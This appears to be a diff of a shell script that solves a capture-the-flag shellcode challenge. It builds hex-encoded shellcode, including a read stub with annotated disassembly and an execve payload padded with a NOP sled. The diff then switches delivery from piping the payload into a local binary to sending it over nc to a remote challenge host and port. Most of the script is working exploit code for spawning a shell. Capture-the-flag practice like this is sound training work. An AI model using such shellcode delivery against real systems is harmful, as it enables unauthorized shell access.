@@ -7,6 +7,9 @@ if [[ -e payload_7_2 ]]; then
     rm payload_7_2
 fi
 
+host="ctf.adl.tw"
+port="10004"
+
 
 frame="\x0c\x87\x63\x01\x01\x01"
 
@@ -14,7 +17,7 @@ frame="\x0c\x87\x63\x01\x01\x01"
 shellcode_sys_read_part1="\x0c\x87\x63\xd0\x89\xdb"
 : << Instruction
 0c 87                   or     al, 0x87
-63 d0                   movsxd edx, eax  # assign buffer size, by the way this line can be executed, but it can't be assembled by nasm.
+63 d0                   movsxd edx, eax  # ssign buffer size, by the way this line can be executed, but it can't be assembled by nasm.
 89 db                   mov    ebx, ebx  # do nothing, regarded as 2 bytes nop
 Instruction
 
@@ -44,4 +47,4 @@ Instruction
 
 echo -ne $(printf "\x90%.0s" $(seq 1 12))$shellcode_sys_exeve > payload_7_2
 
-(cat payload_7_1; cat payload_7_2; cat - ) | ./shellcode3
+(cat payload_7_1; cat payload_7_2; cat - ) | nc $host $port
